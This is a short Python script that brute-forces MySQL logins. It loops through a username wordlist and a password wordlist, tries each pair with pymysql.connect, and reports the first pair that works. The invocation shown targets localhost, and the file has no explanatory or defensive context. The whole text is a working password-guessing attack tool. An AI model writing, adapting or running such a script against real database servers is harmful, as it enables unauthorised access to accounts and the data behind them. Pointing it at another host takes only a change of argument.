import pymysql

def exp_mysql(host, user_dir, pass_dir):
    with open(user_dir, 'r') as fu:
        username = fu.readline().strip()
        while username:
            with open(pass_dir, 'r') as fp:
                password = fp.readline().strip()
                while password:
                    try:
                        pymysql.connect(host=host, user=username, password=password)
                    except:
                        print('❎ {}/{}'.format(username, password))
                    else:
                        print('✅ {}/{}'.format(username, password))
                        print('OK!')
                        return
                    finally:
                        password = fp.readline().strip()
            username = fu.readline().strip()


exp_mysql('127.0.0.1', 'username.txt', 'passwd.txt')